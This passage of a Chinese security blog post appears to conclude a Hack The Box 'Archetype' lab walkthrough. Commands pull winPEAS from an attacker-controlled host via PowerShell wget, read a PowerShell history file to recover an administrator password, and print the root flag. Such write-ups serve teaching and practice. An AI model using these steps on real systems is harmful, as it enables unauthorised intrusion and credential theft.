+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\sql_svc\Downloads&gt;powershell -c wget http://10.10.14.68/winPEASx64.exe -outfile winPEASx64.exe<br>powershell -c wget http://10.10.14.68/winPEASx64.exe -outfile winPEASx64.exe<br><br>10.129.168.67 - - [18/Jul/2023 05:09:58] <span class="hljs-string">&quot;GET /winPEASx64.exe HTTP/1.1&quot;</span> 200 -<br><br>C:\Users\sql_svc\Downloads&gt;<span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is 9565-0B4F<br><br> Directory of C:\Users\sql_svc\Downloads<br><br>07/18/2023  02:09 AM    &lt;DIR&gt;          .<br>07/18/2023  02:09 AM    &lt;DIR&gt;          ..<br>07/18/2023  01:41 AM            45,272 nc64.exe<br>07/18/2023  02:06 AM                 0 powershell<br>07/18/2023  02:10 AM         1,930,752 winPEASx64.exe<br>               3 File(s)      1,976,024 bytes<br>               2 Dir(s)  10,710,515,712 bytes free<br></code></pre></td></tr></table></figure>
+
+<p>使用命令运行提权工具，最后显示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">����������͹ Analyzing Other Windows Files Files (<span class="hljs-built_in">limit</span> 70)<br><br>       /---------------------------------------------------------------------------\                         <br>       |                             Do you like PEASS?                            |                         <br>       |---------------------------------------------------------------------------|                         <br>       |         Become a Patreon    :     https://www.patreon.com/peass           |                         <br>       |         Follow on Twitter   :     @carlospolopm                           |                         <br>       |         Respect on HTB      :     SirBroccoli &amp; makikvues                 |                         <br>       |---------------------------------------------------------------------------|                         <br>       |                                 Thank you!                                |                         <br>       \---------------------------------------------------------------------------/<br></code></pre></td></tr></table></figure>
+
+<p>密码：MEGACORP_4dm1n!!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\sql_svc\Downloads&gt;<span class="hljs-built_in">cd</span> ..<br><span class="hljs-built_in">cd</span> ..<br><br>C:\Users\sql_svc&gt;<span class="hljs-built_in">cd</span> AppData<br><span class="hljs-built_in">cd</span> AppData<br><br>C:\Users\sql_svc\AppData&gt;<span class="hljs-built_in">cd</span> \Roaming\Microsoft\Windows\PowerShell\PSReadline\  <br><span class="hljs-built_in">cd</span> \Roaming\Microsoft\Windows\PowerShell\PSReadline\<br>The system cannot find the path specified.<br><br>C<span class="hljs-string">&#x27; is not recognized as an internal or external command,</span><br><span class="hljs-string">operable program or batch file.</span><br><span class="hljs-string"></span><br><span class="hljs-string">C:\Users\sql_svc\AppData&gt;cd Roaming\Microsoft\Windows\PowerShell\PSReadline\               </span><br><span class="hljs-string">cd Roaming\Microsoft\Windows\PowerShell\PSReadline\</span><br><span class="hljs-string"></span><br><span class="hljs-string">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;dir</span><br><span class="hljs-string">dir</span><br><span class="hljs-string"> Volume in drive C has no label.</span><br><span class="hljs-string"> Volume Serial Number is 9565-0B4F</span><br><span class="hljs-string"></span><br><span class="hljs-string"> Directory of C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</span><br><span class="hljs-string"></span><br><span class="hljs-string">01/20/2020  06:04 AM    &lt;DIR&gt;          .</span><br><span class="hljs-string">01/20/2020  06:04 AM    &lt;DIR&gt;          ..</span><br><span class="hljs-string">03/17/2020  02:36 AM                79 ConsoleHost_history.txt</span><br><span class="hljs-string">               1 File(s)             79 bytes</span><br><span class="hljs-string">               2 Dir(s)  10,710,208,512 bytes free</span><br><span class="hljs-string"></span><br><span class="hljs-string">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;type ConsoleHost_history.txt</span><br><span class="hljs-string">type ConsoleHost_history.txt</span><br><span class="hljs-string">net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!</span><br><span class="hljs-string">exit</span><br><span class="hljs-string"></span><br><span class="hljs-string">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;python3 psexec.py administrator@10.129.168.67</span><br><span class="hljs-string">python3 psexec.py administrator@10.129.168.67</span><br><span class="hljs-string">&#x27;</span>python3<span class="hljs-string">&#x27; is not recognized as an internal or external command,</span><br><span class="hljs-string">operable program or batch file.</span><br><span class="hljs-string"></span><br><span class="hljs-string">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\system32&gt; <span class="hljs-built_in">cd</span> ..<br> <br>C:\Windows&gt; <span class="hljs-built_in">cd</span> ..<br> <br>C:\&gt; <span class="hljs-built_in">cd</span> User<br>The system cannot find the path specified.<br> <br>C:\&gt; <span class="hljs-built_in">cd</span> Users<br> <br>C:\Users&gt; <span class="hljs-built_in">cd</span> Administartor<br>The system cannot find the path specified.<br><br>C:\Users&gt; <span class="hljs-built_in">cd</span> Administrator<br> <br>C:\Users\Administrator&gt; <span class="hljs-built_in">cd</span> Desktop<br> <br>C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">type</span> root.txt<br>b91ccec3305e98240082d4474b848528<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../image/Untitled.png" alt="PWN"></p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/07/22/web%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0%E7%AC%AC45%E5%A4%A9/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>web攻防笔记第45天</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/07/13/HTB-Three/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      HTB-Three
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">人</div><div class="matts">人</div><div class="matts">为</div><div class="matts">我</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">我</div><div class="matts">为</div><div class="matts">人</div><div class="matts">人</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">Theme Tranquility</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:flow63681@gmail.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/ABCkillmen">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-wx.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.freebuf.com/author/FlowsecNagi">Freebuf</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-zh.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.zhihu.com/">知乎</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:flow63681@gmail.com">flow63681@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">FlowsecNagi's Home</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+  
+
+  </body>
+</html>
